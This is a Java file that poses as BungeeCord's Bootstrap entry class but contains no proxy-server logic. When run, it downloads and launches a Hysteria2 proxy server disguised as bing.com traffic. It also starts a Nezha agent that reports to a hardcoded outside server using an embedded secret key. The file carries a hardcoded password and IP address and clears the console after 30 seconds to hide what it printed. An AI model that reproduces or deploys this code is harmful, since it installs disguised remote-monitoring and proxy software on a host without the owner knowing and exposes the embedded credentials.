package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Stream;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process hy2Process;
    private static Process nezhaProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "UUID", "UDP_PORT", "DOMAIN", "HY2_PASSWORD",
        "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY", "NEZHA_TLS"
    };

    public static void main(String[] args) throws Exception
    {
        try {
            Map<String, String> config = loadConfig();
            
            // 1. 启动哪吒
            if (isNezhaConfigured(config)) {
                runNezhaAgent(config);
            }
            
            // 2. 启动 Hysteria2
            String hy2Url = generateHy2Url(config);
            
            System.out.println(ANSI_GREEN + "\n=== Hysteria2 Configuration ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Password: " + config.get("HY2_PASSWORD") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "UDP Port: " + config.get("UDP_PORT") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Domain: " + config.get("DOMAIN") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "\n=== Hysteria2 Node URL ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + hy2Url + ANSI_RESET);
            System.out.println(ANSI_GREEN + "================================" + ANSI_RESET);
            
            runHysteria2Service(config);
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));
            
            // 延时清屏
            new Thread(() -> {
                try {
                    Thread.sleep(30000); 
                    clearConsole();
                } catch (InterruptedException e) {}
            }).start();
            
            // 保持主线程活跃
            while (running.get()) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    break;
                }
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Init Error: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }
    
    private static void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
        } catch (Exception ignored) {}
    }
    
    private static boolean isNezhaConfigured(Map<String, String> config) {
        String server = config.get("NEZHA_SERVER");
        String key = config.get("NEZHA_KEY");
        return server != null && !server.trim().isEmpty() 
            && key != null && !key.trim().isEmpty();
    }
    
    private static void runNezhaAgent(Map<String, String> config) throws Exception {
        Path nezhaPath = downloadNezhaAgent();
        Path nezhaConfigPath = createNezhaConfig(config);
        
        // 强力清理旧数据
        Path nezhaDir = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-work");
        if (Files.exists(nezhaDir)) {
            try (Stream<Path> walk = Files.walk(nezhaDir)) {
                walk.sorted(Comparator.reverseOrder())
                    .map(Path::toFile)
                    .forEach(File::delete);
            } catch (Exception e) {}
        }
        Files.createDirectories(nezhaDir);
        
        System.out.println(ANSI_GREEN + "Starting Nezha Agent..." + ANSI_RESET);
        
        System.out.println("--- Generated Config Content ---");
        Files.readAllLines(nezhaConfigPath).forEach(System.out::println);
        System.out.println("--------------------------------");

        List<String> cmd = new ArrayList<>();
        cmd.add(nezhaPath.toString());
        cmd.add("-c");
        cmd.add(nezhaConfigPath.toString());
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.directory(nezhaDir.toFile());
        pb.redirectErrorStream(true);
        
        nezhaProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(nezhaProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("NEZHA") || line.contains("error") || line.contains("Error")) {
                        System.out.println(ANSI_GREEN + "[Nezha] " + ANSI_RESET + line);
                    }
                }
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(1000);
        if (!nezhaProcess.isAlive()) {
             System.out.println(ANSI_RED + "Nezha Agent exited prematurely: " + nezhaProcess.exitValue() + ANSI_RESET);
        }
    }
    
    private static void runHysteria2Service(Map<String, String> config) throws Exception {
        Path hy2Path = downloadHysteria2();
        Path configPath = createHysteria2Config(config);
        
        System.out.println(ANSI_GREEN + "Starting Hysteria2 Server..." + ANSI_RESET);
        
        ProcessBuilder pb = new ProcessBuilder(
            hy2Path.toString(), "server", "-c", configPath.toString()
        );
        pb.redirectErrorStream(true);
        
        hy2Process = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(hy2Process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println(ANSI_YELLOW + "[Hysteria2] " + ANSI_RESET + line);
                }
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(1000);
        if (!hy2Process.isAlive()) {
             System.out.println(ANSI_RED + "Hysteria2 Server exited prematurely: " + hy2Process.exitValue() + ANSI_RESET);
        }
    }
    
    private static Map<String, String> loadConfig() {
        Map<String, String> config = new HashMap<>();
        // 默认配置
        config.put("UUID", "9d390099-7b19-407b-9695-98a02df03a88");
        config.put("HY2_PASSWORD", "wocao147");  // Hysteria2 使用密码认证
        config.put("UDP_PORT", "25389");  // UDP 端口
        config.put("DOMAIN", "151.242.106.72");
        config.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        config.put("NEZHA_PORT", "");
        config.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        config.put("NEZHA_TLS", "false"); 
        
        // 环境变量覆盖
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.isEmpty()) config.put(var, value);
        }
        return config;
    }
    
    private static String generateHy2Url(Map<String, String> config) {
        try {
            // hysteria2://password@domain:port?insecure=1#HY2-Node
            String password = URLEncoder.encode(config.get("HY2_PASSWORD"), "UTF-8");
            return "hysteria2://" + password + "@" + config.get("DOMAIN") + ":" + 
                   config.get("UDP_PORT") + "?insecure=1#HY2-Node";
        } catch (Exception e) { 
            return ""; 
        }
    }
    
    private static Path createHysteria2Config(Map<String, String> config) throws IOException {
        String yaml = String.format(
            "listen: :%s\n\n" +
            "tls:\n" +
            "  cert: /tmp/cert.pem\n" +
            "  key: /tmp/key.pem\n\n" +
            "auth:\n" +
            "  type: password\n" +
            "  password: %s\n\n" +
            "masquerade:\n" +
            "  type: proxy\n" +
            "  proxy:\n" +
            "    url: https://www.bing.com\n" +
            "    rewriteHost: true\n",
            config.get("UDP_PORT"),
            config.get("HY2_PASSWORD")
        );
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "hysteria2-config.yaml");
        Files.write(path, yaml.getBytes());
        
        // 生成自签名证书
        generateSelfSignedCert();
        
        System.out.println(ANSI_GREEN + "Hysteria2 Config created" + ANSI_RESET);
        return path;
    }
    
    private static void generateSelfSignedCert() throws IOException {
        Path certPath = Paths.get("/tmp/cert.pem");
        Path keyPath = Paths.get("/tmp/key.pem");
        
        if (!Files.exists(certPath) || !Files.exists(keyPath)) {
            System.out.println("Generating self-signed certificate...");
            try {
                new ProcessBuilder(
                    "openssl", "req", "-x509", "-nodes", "-newkey", "rsa:2048",
                    "-keyout", keyPath.toString(),
                    "-out", certPath.toString(),
                    "-days", "365",
                    "-subj", "/CN=localhost"
                ).start().waitFor();
            } catch (InterruptedException e) {
                throw new IOException("Certificate generation interrupted", e);
            }
        }
    }
    
    private static Path createNezhaConfig(Map<String, String> config) throws IOException {
        String server = config.get("NEZHA_SERVER");
        String port = config.getOrDefault("NEZHA_PORT", "5555");
        if (!server.contains(":")) server += ":" + port;
        
        boolean tls = false;
        if (config.containsKey("NEZHA_TLS") && !config.get("NEZHA_TLS").isEmpty()) {
            tls = Boolean.parseBoolean(config.get("NEZHA_TLS"));
        }
        
        String uuid = config.get("UUID");
        String secret = config.get("NEZHA_KEY");
        
        String yml = String.format(
            "client_id: \"%s\"\n" +
            "uuid: \"%s\"\n" +
            "client_secret: \"%s\"\n" +
            "debug: true\n" +
            "server: \"%s\"\n" +
            "tls: %b\n" +
            "report_delay: 4\n" +
            "skip_connection_count: true\n" +
            "skip_procs_count: true\n" +
            "disable_auto_update: true\n" +
            "disable_force_update: true\n",
            uuid,
            uuid,
            secret,
            server,
            tls
        );
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-config.yml");
        Files.write(path, yml.getBytes());
        System.out.println(ANSI_GREEN + "Nezha Config created for UUID: " + uuid + ANSI_RESET);
        return path;
    }
    
    private static Path downloadHysteria2() throws IOException {
        String url = "https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64";
        if (System.getProperty("os.arch").contains("aarch64")) {
            url = "https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-arm64";
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "hysteria2");
        if (!Files.exists(path)) {
            System.out.println("Downloading Hysteria2...");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static Path downloadNezhaAgent() throws IOException {
        String url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip";
        if (System.getProperty("os.arch").contains("aarch64")) {
            url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.zip";
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
        if (!Files.exists(path)) {
            System.out.println("Downloading Nezha...");
            Path zip = Paths.get(System.getProperty("java.io.tmpdir"), "nezha.zip");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, zip, StandardCopyOption.REPLACE_EXISTING);
            }
            try {
                new ProcessBuilder("unzip", "-o", zip.toString(), "nezha-agent", "-d", System.getProperty("java.io.tmpdir")).start().waitFor();
            } catch (InterruptedException e) {
                throw new IOException("Nezha unzip interrupted", e);
            }
            Files.delete(zip);
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static void stopServices() {
        if (nezhaProcess != null) nezhaProcess.destroy();
        if (hy2Process != null) hy2Process.destroy();
    }
}
